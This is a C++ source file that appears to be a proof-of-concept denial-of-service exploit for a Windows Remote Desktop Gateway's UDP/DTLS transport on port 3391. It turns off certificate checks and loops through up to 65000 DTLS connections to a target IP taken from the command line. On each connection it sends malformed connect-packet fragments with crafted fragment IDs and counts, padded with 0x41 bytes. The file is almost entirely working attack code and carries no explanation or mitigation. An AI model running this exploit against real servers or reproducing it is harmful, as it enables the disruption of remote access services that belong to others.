// RDG_POC.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
//#include <iphlpapi.h>
#include "Header.h"
#include <stdio.h>
//#include <socketapi.h>
#include <openssl/ssl.h>
//#include <errno.h>
#pragma comment(lib, "Ws2_32.lib")

#define BUFFLEN 1024
#define BUFFER_SIZE          500
#define MAX_STACK            (1<<16)
#define COOKIE_SECRET_LENGTH 16
#define in_port_t u_short

int verbose = 10;
int veryverbose = 0;
int length = 100;
int done = 0;
unsigned char cookie_secret[COOKIE_SECRET_LENGTH];
int cookie_initialized = 0;

struct client_inf {
	SSL_CTX* ctx;
	SSL* ssl;
	BIO* bio;
};

int sendPktDOS(SSL* ssl, int id) {
	_CONNECT_PKT_FRAGMENT packet;

	packet.hdr.pktID = 5;
	packet.hdr.pktLen = sizeof(_CONNECT_PKT_FRAGMENT) - sizeof(UDP_PACKET_HEADER);;
	packet.usFragmentID = id;
	packet.usNoOfFragments = id;
	packet.cbFragmentLength = 999;
	memset(packet.fragment, 0x41, 999);

	char pkt[sizeof(packet)];
	memcpy(&pkt, &packet, sizeof(packet));

	int len = SSL_write(ssl, pkt, sizeof(pkt));
	switch (SSL_get_error(ssl, len)) {
	case SSL_ERROR_NONE:
		break;
	case SSL_ERROR_WANT_WRITE:
		/* Can't write because of a renegotiation, so
		 * we actually have to retry sending this message...
		 */
		break;
	case SSL_ERROR_WANT_READ:
		/* continue with reading */
		break;
	case SSL_ERROR_SYSCALL:
		printf("Socket write error: ");
		//reading = 0;
		break;
	case SSL_ERROR_SSL:
		printf("SSL write error: ");
		//printf("%s (%d)\n", ERR_error_string(ERR_get_error(), buf), SSL_get_error(ssl, len));
		//goto cleanup;
		break;
	default:
		printf("Unexpected error while writing!\n");
		//goto cleanup;
		break;
	}

	return 1;
}

void init(){
	WSADATA wsaData;
	int response = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (response != 0) {
		printf("WSA failed");
		exit(-1);
	}
	SSL_library_init();
	SSL_load_error_strings();
	ERR_load_BIO_strings();
	OpenSSL_add_all_algorithms();
}

SSL* createUDPSock(char *hostname, int port) {
	int fd;
	sockaddr_in s4;
	client_inf client;
	struct timeval timeout;
	inet_pton(AF_INET, hostname, &(s4.sin_addr));
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	s4.sin_family = AF_INET;
	s4.sin_port = htons(3391);
	if (fd < 0) {
		printf("Error registering socket\n");
		exit(-1);
	}
	int con_res = connect(fd, (struct sockaddr*)&s4, sizeof(s4));
	if (con_res != 0) {
		closesocket(fd);
		printf("failed to connect\n");
		exit(-1);
	}
	client.ctx = SSL_CTX_new(DTLS_client_method());
	SSL_CTX_set_verify(client.ctx, SSL_VERIFY_NONE, NULL);
	client.bio = BIO_new_ssl_connect(client.ctx);
	BIO_set_conn_hostname(client.bio, hostname);
	timeout.tv_sec = 1;
	timeout.tv_usec = 0;
	
	BIO_get_ssl(client.bio, &client.ssl);
	BIO_ctrl(SSL_get_rbio(client.ssl), BIO_CTRL_DGRAM_SET_RECV_TIMEOUT, 0, &timeout);
	SSL_set_mode(client.ssl, SSL_MODE_AUTO_RETRY);
	SSL_set_fd(client.ssl, fd);

	if (SSL_connect(client.ssl) != 1) {
		return NULL;
	}
	return client.ssl;
}

SSL* getConn(char *hostname) {
	SSL* ssl;
	int port = 3391;
	const char* remote_address = hostname;

	
	ssl = createUDPSock((char*)remote_address, port);
	if (ssl == NULL) {
		printf("Failed---\n");
		exit(-1);
	}
	return ssl;
}

int main(int argc, char* argv[])
{
	if (argc < 2) {

		printf("Usage ./%s [IP]", argv[0]);
		exit(-1);
	}
	SSL* ssl;
	int i = 0;
	init();
	printf("Testing...\n");
	
	while (i++ < 65000) {
		ssl = getConn(argv[1]);

		for (int n = 0; n < 2; n++) {
			sendPktDOS(ssl, i + n+500);
		}

		i++;
	}
	printf("Connection closed.\n");
	WSACleanup();
	return(0);
}
